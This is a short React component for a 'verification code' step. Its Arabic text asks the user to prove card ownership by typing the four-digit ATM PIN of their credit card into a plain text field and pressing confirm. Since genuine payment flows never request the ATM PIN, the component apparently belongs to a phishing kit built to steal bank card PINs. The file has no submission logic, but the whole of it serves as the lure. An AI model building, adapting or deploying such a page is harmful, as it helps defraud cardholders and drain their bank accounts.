import React from "react";

function VerificationCode2() {
  return (
    <div className="bg-white">
      <div
        className="p-4 rounded-lg border shadow-lg  max-w-[650px] mx-auto  text-slate-700"
        style={{ direction: "ltr" }}
      >
        <div>Images</div>

        <form className="my-6 py-16">
          <h4 className="font-semibold text-xl  text-center">
            اثبات ملكية البطاقة - كلمة سر البطاقة <br />
            يرجي ادخال ركز سحب الصراف المكون من اربع خانات الخاص ببطاقتك
            الاتمانية
          </h4>
          <input required type="text" className="input-text" />
          <button className="bg-main w-1/2 mx-auto p-3 rounded-lg block text-white font-semibold text-xl my-4">
            تاكيد
          </button>
        </form>
      </div>
    </div>
  );
}

export default VerificationCode2;
